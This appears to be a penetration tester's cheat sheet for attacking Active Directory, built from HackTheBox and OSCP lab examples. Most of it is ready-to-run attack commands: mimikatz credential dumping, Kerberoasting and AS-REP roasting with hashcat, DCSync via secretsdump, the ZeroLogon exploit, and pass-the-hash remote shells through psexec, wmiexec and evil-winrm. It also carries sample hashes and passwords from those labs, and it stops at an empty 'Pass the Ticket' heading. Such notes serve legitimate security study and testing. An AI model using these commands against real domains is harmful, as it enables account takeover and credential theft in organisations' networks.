# Enumeration

```bas
net user
net user /domain
net user jeff_admin /domain
net group /domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()


Nmap –p 88 –script-args krb5-enum-users.realm='sv-dc01.svcorp.com',userdb=./Secli 10.11.1.20
```



### AD Dump

```bash
ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
```



```bash
#Mimikatz
sekurlsa::logonpasswords  #show current cashed Password
mimikatz # sekurlsa::logonpasswords


```



# Authentication

**NTLM**

> NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos authentication.
>
> CHALLENGE BASED



**Kerberos**

> Basically, Kerberos is a network authentication protocol that works by using secret key cryptography. Clients authenticate with a Key Distribution Center and get temporary keys to access locations on the network. This allows for strong and secure authentication without transmitting passwords.
>
> TICKET BASED.

# Cashed Passwords

```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list /export

OR
klist


sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861

```

# Service Account Attacks

**SPN**

A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.



**Brute-force**

```bash
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

```bash
$ net accounts # show lockout policy

```



# Kerbroasting

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it is possible to request and receive a ticket to crack without a valid account on the domain.

```powershell
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force

smbmap -H 10.10.10.100 -d active.htb -u administrator -p <Password>
psexec.py active.htb/administrator@10.10.10.100
```



# AS-REP Roasting

AS-REP roasting is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected:

```powershell
C:\> kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/wordlist.txt --dc 10.10.10.175
C:\> GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
C:\> hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
C:\> evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```



# DCSync

```powershell
$ secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

C:\> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

$ wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175

$ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175

$ evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```



# ZeroLogon

**POC**

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
```

```shell
python /opt/CVE-2020-1472/cve-2020-1472-exploit.py MONTEVERDE 10.10.10.172
secretsdump.py -just-dc -no-pass MONTEVERDE\$@10.10.10.172
evil-winrm -u administrator -i 10.10.10.172 --hash '100a42db8caea588a626d3a9378cd7ea'
```



# Lateral Movement

**Pass The Hash**

```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

**Overpass the Hash**

```powershell
$ privilege::debug
$ sekurlsa::pth /user:alice /domain:sv-dc01.svcorp.com /ntlm:7f004ce6b8f7b2a3b6c477806799b9c0 /run:PowerShell.exe


```



**Pass the Ticket**

